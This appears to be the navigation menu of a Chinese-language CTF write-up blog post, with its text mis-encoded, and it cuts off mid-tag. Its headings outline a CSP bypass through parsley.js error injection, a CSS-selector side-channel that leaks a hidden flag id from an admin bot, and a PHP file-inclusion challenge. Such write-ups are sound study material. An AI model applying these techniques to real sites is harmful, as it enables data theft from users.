href="#è€Œscript-srcè®¾ç½®çš„nonceåªèƒ½åœ¨header-phpä½¿ç”¨äº†ï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿæ‹¿ä¸åˆ°è¿™ä¸ªnonce"><span class="nav-number">1.0.2.9.</span> <span class="nav-text">è€Œscript-srcè®¾ç½®çš„nonceåªèƒ½åœ¨header.phpä½¿ç”¨äº†ï¼Œè€Œä¸”æˆ‘ä»¬ä¹Ÿæ‹¿ä¸åˆ°è¿™ä¸ªnonce</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ‰€ä»¥æˆ‘ä»¬å¯èƒ½éœ€è¦å¾€ç‚¹å‡»äº‹ä»¶é‚£ä¸€æ–¹é¢æ€è€ƒï¼Œå¹¶ä¸”åˆ©ç”¨é¢˜ç›®å¼•å…¥çš„ä¸¤ä¸ª-js-æ–‡ä»¶å…¥æ‰‹ï¼Œä¸€ä¸ª-jquery-js-ï¼Œå¦ä¸€ä¸ª-parsley-jsã€‚"><span class="nav-number">1.0.2.10.</span> <span class="nav-text">æ‰€ä»¥æˆ‘ä»¬å¯èƒ½éœ€è¦å¾€ç‚¹å‡»äº‹ä»¶é‚£ä¸€æ–¹é¢æ€è€ƒï¼Œå¹¶ä¸”åˆ©ç”¨é¢˜ç›®å¼•å…¥çš„ä¸¤ä¸ª js æ–‡ä»¶å…¥æ‰‹ï¼Œä¸€ä¸ª jquery.js ï¼Œå¦ä¸€ä¸ª parsley.jsã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Parsley-js"><span class="nav-number">1.0.2.11.</span> <span class="nav-text">Parsley.js</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬å¯ä»¥å»parsley-js-docçœ‹åˆ°è¯¥libçš„ç®€å•è¯´æ˜ä»¥åŠä½¿ç”¨ï¼š"><span class="nav-number">1.0.2.12.</span> <span class="nav-text">æˆ‘ä»¬å¯ä»¥å»parsley.js docçœ‹åˆ°è¯¥libçš„ç®€å•è¯´æ˜ä»¥åŠä½¿ç”¨ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸ªç®€å•çš„å‰ç«¯éªŒè¯åº“ï¼Œç®€å•æŸ¥ä¸€ä¸‹æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æœ‰å‡ ä¸ªæœ‰æ„æ€çš„-APIï¼š"><span class="nav-number">1.0.2.13.</span> <span class="nav-text">å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸ªç®€å•çš„å‰ç«¯éªŒè¯åº“ï¼Œç®€å•æŸ¥ä¸€ä¸‹æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æœ‰å‡ ä¸ªæœ‰æ„æ€çš„ APIï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ ¹æ®æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨data-parsley-triggerè®¾ç½®æˆ‘ä»¬çš„è§¦å‘æ–¹å¼ï¼Œä½¿ç”¨data-parsley-error-messageæ¥è‡ªå®šä¹‰æˆ‘ä»¬çš„é”™è¯¯ä¿¡æ¯ï¼Œä½¿ç”¨data-parsley-errors-containeræ¥è‡ªå®šä¹‰æˆ‘ä»¬çš„æ˜¾ç¤ºé”™è¯¯çš„ä½ç½®ã€‚"><span class="nav-number">1.0.2.14.</span> <span class="nav-text">æ ¹æ®æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨data-parsley-triggerè®¾ç½®æˆ‘ä»¬çš„è§¦å‘æ–¹å¼ï¼Œä½¿ç”¨data-parsley-error-messageæ¥è‡ªå®šä¹‰æˆ‘ä»¬çš„é”™è¯¯ä¿¡æ¯ï¼Œä½¿ç”¨data-parsley-errors-containeræ¥è‡ªå®šä¹‰æˆ‘ä»¬çš„æ˜¾ç¤ºé”™è¯¯çš„ä½ç½®ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ ¹æ®æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•ç”¨ä¸€ä¸ªdata-parsley-validateæŒ‡å®šæˆ‘ä»¬éœ€è¦éªŒè¯çš„è¡¨å•ï¼Œç„¶ååˆ©ç”¨é”™è¯¯ä¿¡æ¯æŠŠå…ƒç´ æ ‡ç­¾è¾“å‡ºå‡ºæ¥ï¼Œå¹¶ä¸”æˆ‘ä»¬æ¥ç€è¿˜å¯ä»¥åˆ©ç”¨æŒ‡å®šè¾“å‡ºä½ç½®æ¥æ§åˆ¶è¾“å‡ºï¼Œä¾‹å¦‚ï¼š"><span class="nav-number">1.0.2.15.</span> <span class="nav-text">æ ¹æ®æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•ç”¨ä¸€ä¸ªdata-parsley-validateæŒ‡å®šæˆ‘ä»¬éœ€è¦éªŒè¯çš„è¡¨å•ï¼Œç„¶ååˆ©ç”¨é”™è¯¯ä¿¡æ¯æŠŠå…ƒç´ æ ‡ç­¾è¾“å‡ºå‡ºæ¥ï¼Œå¹¶ä¸”æˆ‘ä»¬æ¥ç€è¿˜å¯ä»¥åˆ©ç”¨æŒ‡å®šè¾“å‡ºä½ç½®æ¥æ§åˆ¶è¾“å‡ºï¼Œä¾‹å¦‚ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#data-parsley-triggeræŒ‡å®šäº†bluräº‹ä»¶ï¼Œä¹Ÿå°±æ˜¯å½“æˆ‘ä»¬çš„-input-å¤±ç„¦æ—¶ï¼Œä¼šæ˜¾ç¤ºæˆ‘ä»¬çš„é”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”åœ¨-id-ä¸º-div1-çš„å…ƒç´ ä¸­æ˜¾ç¤ºï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œæµè§ˆå™¨ä¹Ÿå°†å…¶è¿›è¡Œäº†æ¸²æŸ“ã€‚"><span class="nav-number">1.0.2.16.</span> <span class="nav-text">data-parsley-triggeræŒ‡å®šäº†bluräº‹ä»¶ï¼Œä¹Ÿå°±æ˜¯å½“æˆ‘ä»¬çš„ input å¤±ç„¦æ—¶ï¼Œä¼šæ˜¾ç¤ºæˆ‘ä»¬çš„é”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”åœ¨ id ä¸º div1 çš„å…ƒç´ ä¸­æ˜¾ç¤ºï¼Œæ›´é‡è¦çš„æ˜¯ï¼Œæµè§ˆå™¨ä¹Ÿå°†å…¶è¿›è¡Œäº†æ¸²æŸ“ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Click"><span class="nav-number">1.0.2.17.</span> <span class="nav-text">Click</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å›åˆ°é¢˜ç›®å½“ä¸­ï¼Œadmin-æ‰€åšçš„åŠ¨ä½œæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªå°±æ˜¯ç™»å½•ï¼Œæ ¹æ®é¢˜ç›®ä¿¡æ¯ï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šå¯¹è¿™ä¸ªæ“ä½œæ²¡åŠæ³•è¿›è¡Œä»€ä¹ˆå¹²æ‰°ï¼Œå¦å¤–ä¸€ä¸ªå°±æ˜¯ç‚¹èµäº†ï¼Œæ›´å…·ä½“æ¥è¯´å°±æ˜¯é€šè¿‡-show-php-æ‰“å¼€ä½ çš„-writeup-å†…å®¹ï¼Œå¹¶ä¸”ç‚¹å‡»é¡µé¢ä¸Š-id-ä¸º-like-çš„-input-æ ‡ç­¾ï¼Œæ‰€ä»¥æˆ‘ä»¬æ›´å¯èƒ½çš„äº‹å¯¹ç‚¹èµæ“ä½œè¿›è¡Œä¸€ä¸ªå¹²æ‰°æˆ–è€…å…¶ä»–çš„æ“ä½œï¼Œå¹¶ä¸”æ ¹æ®å®é™…æµ‹è¯•ï¼Œé€šè¿‡selenium-webdriverè°ƒç”¨find-element-by-xpathå‡½æ•°å¾—åˆ°çš„-id-ä¸º-like-çš„-input-å…ƒç´ åªèƒ½æœ‰ç¬¬ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿æˆ‘ä»¬åœ¨-writeup-å†…å®¹ä¸­æ’å…¥ä¸€ä¸ª-id-ä¸º-like-çš„-input-æ ‡ç­¾ï¼Œadmin-ä¹Ÿåªä¼šæ ¹æ®é¡µé¢é¡ºåºæ‹¿åˆ°ç¬¬ä¸€ä¸ªç‚¹èµ-input-ã€‚"><span class="nav-number">1.0.2.18.</span> <span class="nav-text">å›åˆ°é¢˜ç›®å½“ä¸­ï¼Œadmin æ‰€åšçš„åŠ¨ä½œæœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªå°±æ˜¯ç™»å½•ï¼Œæ ¹æ®é¢˜ç›®ä¿¡æ¯ï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šå¯¹è¿™ä¸ªæ“ä½œæ²¡åŠæ³•è¿›è¡Œä»€ä¹ˆå¹²æ‰°ï¼Œå¦å¤–ä¸€ä¸ªå°±æ˜¯ç‚¹èµäº†ï¼Œæ›´å…·ä½“æ¥è¯´å°±æ˜¯é€šè¿‡ show.php æ‰“å¼€ä½ çš„ writeup å†…å®¹ï¼Œå¹¶ä¸”ç‚¹å‡»é¡µé¢ä¸Š id ä¸º like çš„ input æ ‡ç­¾ï¼Œæ‰€ä»¥æˆ‘ä»¬æ›´å¯èƒ½çš„äº‹å¯¹ç‚¹èµæ“ä½œè¿›è¡Œä¸€ä¸ªå¹²æ‰°æˆ–è€…å…¶ä»–çš„æ“ä½œï¼Œå¹¶ä¸”æ ¹æ®å®é™…æµ‹è¯•ï¼Œé€šè¿‡selenium.webdriverè°ƒç”¨find_element_by_xpathå‡½æ•°å¾—åˆ°çš„ id ä¸º like çš„ input å…ƒç´ åªèƒ½æœ‰ç¬¬ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿æˆ‘ä»¬åœ¨ writeup å†…å®¹ä¸­æ’å…¥ä¸€ä¸ª id ä¸º like çš„ input æ ‡ç­¾ï¼Œadmin ä¹Ÿåªä¼šæ ¹æ®é¡µé¢é¡ºåºæ‹¿åˆ°ç¬¬ä¸€ä¸ªç‚¹èµ input ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å¹¶ä¸”-CSP-ä¹Ÿé™åˆ¶å¾—å¾ˆä¸¥æ ¼ï¼Œä¼¼ä¹é™·å…¥äº†åƒµå±€ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æœ‰ä»¥ä¸Š-parsley-js-çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬ä¼¼ä¹å¯ä»¥é€šè¿‡é”™è¯¯ä¿¡æ¯æ¥æ„é€ ä¸€äº›-Payload-ã€‚"><span class="nav-number">1.0.2.19.</span> <span class="nav-text">å¹¶ä¸” CSP ä¹Ÿé™åˆ¶å¾—å¾ˆä¸¥æ ¼ï¼Œä¼¼ä¹é™·å…¥äº†åƒµå±€ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æœ‰ä»¥ä¸Š parsley.js çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬ä¼¼ä¹å¯ä»¥é€šè¿‡é”™è¯¯ä¿¡æ¯æ¥æ„é€ ä¸€äº› Payload ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#é¦–å…ˆï¼Œå› ä¸ºfind-element-by-xpathåªä¼šå¾—åˆ°ç¬¬ä¸€ä¸ª-id-ä¸º-like-çš„-input-æ ‡ç­¾ï¼Œè€Œæˆ‘ä»¬é€šè¿‡-parsley-js-å¯ä»¥å°†é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ°æŒ‡å®šé¡µé¢ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¤§æ¦‚å¯ä»¥æœ‰ä¸€ä¸ªæƒ³æ³•ï¼ŒæŠŠä¸€ä¸ªæ²¡æœ‰ç”¨çš„å•ç‹¬çš„-id-ä¸º-like-çš„-input-æ ‡ç­¾æ’å…¥åˆ°åŸæ¥çš„ç‚¹èµæŒ‰é’®ä¹‹å‰ã€‚"><span class="nav-number">1.0.2.20.</span> <span class="nav-text">é¦–å…ˆï¼Œå› ä¸ºfind_element_by_xpathåªä¼šå¾—åˆ°ç¬¬ä¸€ä¸ª id ä¸º like çš„ input æ ‡ç­¾ï¼Œè€Œæˆ‘ä»¬é€šè¿‡ parsley.js å¯ä»¥å°†é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ°æŒ‡å®šé¡µé¢ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¤§æ¦‚å¯ä»¥æœ‰ä¸€ä¸ªæƒ³æ³•ï¼ŒæŠŠä¸€ä¸ªæ²¡æœ‰ç”¨çš„å•ç‹¬çš„ id ä¸º like çš„ input æ ‡ç­¾æ’å…¥åˆ°åŸæ¥çš„ç‚¹èµæŒ‰é’®ä¹‹å‰ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä½†æ˜¯è¿™æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿæˆ‘ä»¬å†æ¥ä»”ç»†çœ‹çœ‹-admin-è¦ç‚¹èµçš„é‚£ä¸ªé¡µé¢"><span class="nav-number">1.0.2.21.</span> <span class="nav-text">ä½†æ˜¯è¿™æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿæˆ‘ä»¬å†æ¥ä»”ç»†çœ‹çœ‹ admin è¦ç‚¹èµçš„é‚£ä¸ªé¡µé¢</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#é¡µé¢ä¸Šéƒ¨åˆ†æ˜¯-header-php-ï¼Œä¼šå±•ç¤ºå½“å‰ç”¨æˆ·æ‰€æäº¤çš„-writeup-ï¼Œä¹Ÿå°±æ˜¯è¯´-admin-çš„è¿™ä¸ªé¡µé¢ï¼Œç¬¬ä¸€ä¸ªä¹Ÿæ˜¯å”¯ä¸€ä¸€ä¸ª-a-æ ‡ç­¾å°±æ˜¯-flag-çš„åœ°å€ï¼Œç°åœ¨çš„é—®é¢˜å°±å˜æˆäº†æˆ‘ä»¬æ€ä¹ˆè·å–è¿™ä¸ªåœ°å€çš„é—®é¢˜äº†ï¼Œæ›´è¯¦ç»†çš„æ¥è¯´ï¼Œæˆ‘ä»¬å¦‚ä½•è·å–è¿™ä¸ª-a-æ ‡ç­¾ä¸­çš„-href-å±æ€§å€¼ï¼Œæˆ–è€…æ›´ç¡®åˆ‡çš„è¯´å°±æ˜¯è·å–-writeup-id-çš„äº‹æƒ…äº†ã€‚"><span class="nav-number">1.0.2.22.</span> <span class="nav-text">é¡µé¢ä¸Šéƒ¨åˆ†æ˜¯ header.php ï¼Œä¼šå±•ç¤ºå½“å‰ç”¨æˆ·æ‰€æäº¤çš„ writeup ï¼Œä¹Ÿå°±æ˜¯è¯´ admin çš„è¿™ä¸ªé¡µé¢ï¼Œç¬¬ä¸€ä¸ªä¹Ÿæ˜¯å”¯ä¸€ä¸€ä¸ª a æ ‡ç­¾å°±æ˜¯ flag çš„åœ°å€ï¼Œç°åœ¨çš„é—®é¢˜å°±å˜æˆäº†æˆ‘ä»¬æ€ä¹ˆè·å–è¿™ä¸ªåœ°å€çš„é—®é¢˜äº†ï¼Œæ›´è¯¦ç»†çš„æ¥è¯´ï¼Œæˆ‘ä»¬å¦‚ä½•è·å–è¿™ä¸ª a æ ‡ç­¾ä¸­çš„ href å±æ€§å€¼ï¼Œæˆ–è€…æ›´ç¡®åˆ‡çš„è¯´å°±æ˜¯è·å– writeup id çš„äº‹æƒ…äº†ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#CSS-Selector"><span class="nav-number">1.0.2.23.</span> <span class="nav-text">CSS Selector</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å¦‚ä½•è·å–-a-æ ‡ç­¾ä¸­çš„-href-å±æ€§å€¼è²Œä¼¼ä¹Ÿå°±è·Ÿæˆ‘ä»¬ä¹‹å‰æåˆ°çš„data-parsley-errors-container-APIæœ‰å…³äº†ï¼Œè€Œè¿™ä¸ª-API-åˆæ”¯æŒ-CSS-é€‰æ‹©å™¨ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥é€šè¿‡-CSS-é€‰æ‹©å™¨æ¥è®©æˆ‘ä»¬çš„æŠ¥é”™ä¿¡æ¯æ”¾åˆ°è¿™ä¸ª-a-æ ‡ç­¾ä¹‹åå‘¢ï¼Œè¿™æ ·ä»¥æ¥ä¹Ÿå°±ç›´æ¥å°±æ”¾åˆ°äº†ç‚¹èµæŒ‰é’®ä¹‹å‰äº†ã€‚"><span class="nav-number">1.0.2.24.</span> <span class="nav-text">å¦‚ä½•è·å– a æ ‡ç­¾ä¸­çš„ href å±æ€§å€¼è²Œä¼¼ä¹Ÿå°±è·Ÿæˆ‘ä»¬ä¹‹å‰æåˆ°çš„data-parsley-errors-container APIæœ‰å…³äº†ï¼Œè€Œè¿™ä¸ª API åˆæ”¯æŒ CSS é€‰æ‹©å™¨ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥é€šè¿‡ CSS é€‰æ‹©å™¨æ¥è®©æˆ‘ä»¬çš„æŠ¥é”™ä¿¡æ¯æ”¾åˆ°è¿™ä¸ª a æ ‡ç­¾ä¹‹åå‘¢ï¼Œè¿™æ ·ä»¥æ¥ä¹Ÿå°±ç›´æ¥å°±æ”¾åˆ°äº†ç‚¹èµæŒ‰é’®ä¹‹å‰äº†ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ç±»ä¼¼ä¹‹å‰-XCTF-Final-ä¸€ä¸ª-CSS-ä¾§ä¿¡é“çš„é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨a-href-39-show-php-id-flag-çš„å½¢å¼æ¥è¿›è¡Œå…ƒç´ é€‰æ‹©ã€‚"><span class="nav-number">1.0.2.25.</span> <span class="nav-text">ç±»ä¼¼ä¹‹å‰ XCTF Final ä¸€ä¸ª CSS ä¾§ä¿¡é“çš„é¢˜ç›®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨a[href^=&#39;/show.php?id={flag}]çš„å½¢å¼æ¥è¿›è¡Œå…ƒç´ é€‰æ‹©ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬ä¼ å…¥çš„-flag-å€¼ä¸é¡µé¢ä¸­çš„-href-å±æ€§å€¼ä¹Ÿå°±æ˜¯-writeup-id-å‰éƒ¨åˆ†å®Œå…¨åŒ¹é…çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸€ä¸ªæ— æ•ˆçš„-id-like-input-æ ‡ç­¾æ’å…¥åˆ°è¯¥-a-æ ‡ç­¾ä¹‹åï¼Œäº¦å³çœŸæ­£ç”¨äºæäº¤-like-è¯·æ±‚çš„-input-æ ‡ç­¾ä¹‹å‰ï¼›å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„-flag-å€¼ä¸é¡µé¢ä¸­çš„-href-å±æ€§å€¼ä¹Ÿå°±æ˜¯-writeup-id-å‰éƒ¨åˆ†ä¸å®Œå…¨åŒ¹é…çš„ï¼Œparsley-js-ä»€ä¹ˆä¹Ÿä¸ä¼šåšï¼Œadmin-ä¼šæ­£å¸¸åœ°ç‚¹èµï¼Œæˆ‘ä»¬å¯ä»¥æ­£å¸¸åœ°åœ¨è‡ªå·±çš„-writeup-é¡µé¢çœ‹åˆ°-admin-çš„ç‚¹èµã€‚"><span class="nav-number">1.0.2.26.</span> <span class="nav-text">ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬ä¼ å…¥çš„ flag å€¼ä¸é¡µé¢ä¸­çš„ href å±æ€§å€¼ä¹Ÿå°±æ˜¯ writeup id å‰éƒ¨åˆ†å®Œå…¨åŒ¹é…çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸€ä¸ªæ— æ•ˆçš„ id=like input æ ‡ç­¾æ’å…¥åˆ°è¯¥ a æ ‡ç­¾ä¹‹åï¼Œäº¦å³çœŸæ­£ç”¨äºæäº¤ like è¯·æ±‚çš„ input æ ‡ç­¾ä¹‹å‰ï¼›å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„ flag å€¼ä¸é¡µé¢ä¸­çš„ href å±æ€§å€¼ä¹Ÿå°±æ˜¯ writeup id å‰éƒ¨åˆ†ä¸å®Œå…¨åŒ¹é…çš„ï¼Œparsley.js ä»€ä¹ˆä¹Ÿä¸ä¼šåšï¼Œadmin ä¼šæ­£å¸¸åœ°ç‚¹èµï¼Œæˆ‘ä»¬å¯ä»¥æ­£å¸¸åœ°åœ¨è‡ªå·±çš„ writeup é¡µé¢çœ‹åˆ° admin çš„ç‚¹èµã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ‰€ä»¥åŸºäºè¿™ä¸ªå·®å¼‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç§å½¢å¼æ¥è¿›è¡Œä¸€ä¸ªä¾§ä¿¡é“æ”»å‡»è·å–-flag-çš„-writeup-idã€‚"><span class="nav-number">1.0.2.27.</span> <span class="nav-text">æ‰€ä»¥åŸºäºè¿™ä¸ªå·®å¼‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç§å½¢å¼æ¥è¿›è¡Œä¸€ä¸ªä¾§ä¿¡é“æ”»å‡»è·å– flag çš„ writeup idã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è„šæœ¬ç¼–å†™ä¹Ÿæ¯”è¾ƒç®€å•ï¼š"><span class="nav-number">1.0.2.28.</span> <span class="nav-text">è„šæœ¬ç¼–å†™ä¹Ÿæ¯”è¾ƒç®€å•ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æ‹¿åˆ°-writeup-id-ä¹‹åç›´æ¥è®¿é—®å³å¯ï¼š"><span class="nav-number">1.0.2.29.</span> <span class="nav-text">æ‹¿åˆ° writeup id ä¹‹åç›´æ¥è®¿é—®å³å¯ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Other-Selector"><span class="nav-number">1.0.2.30.</span> <span class="nav-text">Other Selector</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å½“ç„¶è¯¥é¡µé¢ä¸ä»…å¯ä»¥ä½¿ç”¨-a-æ ‡ç­¾çš„-href-å±æ€§è¿›è¡Œè·å–-writeup-idï¼Œä¹Ÿå¯ä»¥è·å–å®ƒ-value-å€¼ï¼Œä¾‹å¦‚ï¼š"><span class="nav-number">1.0.2.31.</span> <span class="nav-text">å½“ç„¶è¯¥é¡µé¢ä¸ä»…å¯ä»¥ä½¿ç”¨ a æ ‡ç­¾çš„ href å±æ€§è¿›è¡Œè·å– writeup idï¼Œä¹Ÿå¯ä»¥è·å–å®ƒ value å€¼ï¼Œä¾‹å¦‚ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ–è€…ä½¿ç”¨data-parsley-equalto-API-è¿›è¡Œåˆ¤æ–­å±æ€§å€¼ï¼š"><span class="nav-number">1.0.2.32.</span> <span class="nav-text">æˆ–è€…ä½¿ç”¨data-parsley-equalto API è¿›è¡Œåˆ¤æ–­å±æ€§å€¼ï¼š</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#0x03-Includer"><span class="nav-number">1.0.3.</span> <span class="nav-text">0x03 Includer</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#é¢˜ç›®ç»™å‡ºæºä»£ç ä»¥åŠéƒ¨ç½²æ–‡ä»¶ï¼Œæºä»£ç å¦‚ä¸‹ï¼š"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">é¢˜ç›®ç»™å‡ºæºä»£ç ä»¥åŠéƒ¨ç½²æ–‡ä»¶ï¼Œæºä»£ç å¦‚ä¸‹ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Configuration-Error"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">Configuration Error</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å…¶ä¸­é…ç½®æ–‡ä»¶æœ‰ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„é…ç½®é”™è¯¯ï¼š"><span class="nav-number">1.0.3.3.</span> <span class="nav-text">å…¶ä¸­é…ç½®æ–‡ä»¶æœ‰ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„é…ç½®é”™è¯¯ï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#å¼€å¯äº†åˆ—ç›®å½•å¹¶ä¸”æˆ‘ä»¬å¯ä»¥éå†åˆ°ä¸Šå±‚æ–‡ä»¶å¤¹ã€‚"><span class="nav-number">1.0.3.4.</span> <span class="nav-text">å¼€å¯äº†åˆ—ç›®å½•å¹¶ä¸”æˆ‘ä»¬å¯ä»¥éå†åˆ°ä¸Šå±‚æ–‡ä»¶å¤¹ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Update-Arbitrary-Data"><span class="nav-number">1.0.3.5.</span> <span class="nav-text">Update Arbitrary Data</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä¸€å¼€å§‹çœ‹åˆ°è¿‡æ»¤äº†-lt-ï¼Œå°±æƒ³åˆ°äº†pç‰›åšå®¢é‡Œé¢æœ‰å…³æ­»äº¡exitçš„å†…å®¹ï¼Œè°ˆä¸€è°ˆphp-filterçš„å¦™ç”¨ï¼Œä½†æ˜¯pç‰›çš„åŸæ–‡ç”¨çš„æ˜¯file-put-contentï¼Œä½†æ˜¯è¿™é‡Œç”¨çš„æ˜¯file-get-contentsï¼Œå¹¶ä¸”è¿™é‡Œçš„åˆ¤æ–­ä¹Ÿåœ¨ä½¿ç”¨äº†file-get-contentså‡½æ•°ä¹‹åè¿›è¡Œåˆ¤æ–­æ˜¯å¦æœ‰-lt-ï¼Œæ‰€ä»¥è¿™é‡Œçš„ç¼–ç ç»•è¿‡å°±ä¸å¤ªå¯èƒ½äº†ã€‚"><span class="nav-number">1.0.3.6.</span> <span class="nav-text">ä¸€å¼€å§‹çœ‹åˆ°è¿‡æ»¤äº†&lt;?ï¼Œå°±æƒ³åˆ°äº†pç‰›åšå®¢é‡Œé¢æœ‰å…³æ­»äº¡exitçš„å†…å®¹ï¼Œè°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨ï¼Œä½†æ˜¯pç‰›çš„åŸæ–‡ç”¨çš„æ˜¯file_put_contentï¼Œä½†æ˜¯è¿™é‡Œç”¨çš„æ˜¯file_get_contentsï¼Œå¹¶ä¸”è¿™é‡Œçš„åˆ¤æ–­ä¹Ÿåœ¨ä½¿ç”¨äº†file_get_contentså‡½æ•°ä¹‹åè¿›è¡Œåˆ¤æ–­æ˜¯å¦æœ‰&lt;?ï¼Œæ‰€ä»¥è¿™é‡Œçš„ç¼–ç ç»•è¿‡å°±ä¸å¤ªå¯èƒ½äº†ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#è€Œä¸”è¿™é‡Œæœ€å¥‡æ€ªçš„å°±æ˜¯ä¹‹å‰ç”¨äº†ä¸€äº›çœ‹ä¼¼æ— å…³ç´§è¦çš„ä»£ç ï¼Œæ¯”å¦‚ä½¿ç”¨äº†putenv-å‡½æ•°ç­‰ï¼Œç»™äº†æˆ‘ä»¬ä¸€ä¸ªsandboxï¼Œç„¶è€Œæˆ‘ä»¬ä¼¼ä¹æ— æ³•åˆ©ç”¨è¡¨é¢çš„ä»£ç è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ç­‰æ“ä½œã€‚"><span class="nav-number">1.0.3.7.</span> <span class="nav-text">è€Œä¸”è¿™é‡Œæœ€å¥‡æ€ªçš„å°±æ˜¯ä¹‹å‰ç”¨äº†ä¸€äº›çœ‹ä¼¼æ— å…³ç´§è¦çš„ä»£ç ï¼Œæ¯”å¦‚ä½¿ç”¨äº†putenv()å‡½æ•°ç­‰ï¼Œç»™äº†æˆ‘ä»¬ä¸€ä¸ªsandboxï¼Œç„¶è€Œæˆ‘ä»¬ä¼¼ä¹æ— æ³•åˆ©ç”¨è¡¨é¢çš„ä»£ç è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ç­‰æ“ä½œã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#balsné˜Ÿä¼åœ¨å…¬å¼€çš„wpä¸­å†™äº†æ¯”è¾ƒè¯¦ç»†çš„æºç åˆ†æï¼Œè¿™é‡Œæˆ‘å°±é…åˆå…¶ä¸­çš„wpè¿›è¡Œä¸€ä¸‹ç®€å•çš„åˆ†æã€‚"><span class="nav-number">1.0.3.8.</span> <span class="nav-text">balsné˜Ÿä¼åœ¨å…¬å¼€çš„wpä¸­å†™äº†æ¯”è¾ƒè¯¦ç»†çš„æºç åˆ†æï¼Œè¿™é‡Œæˆ‘å°±é…åˆå…¶ä¸­çš„wpè¿›è¡Œä¸€ä¸‹ç®€å•çš„åˆ†æã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" 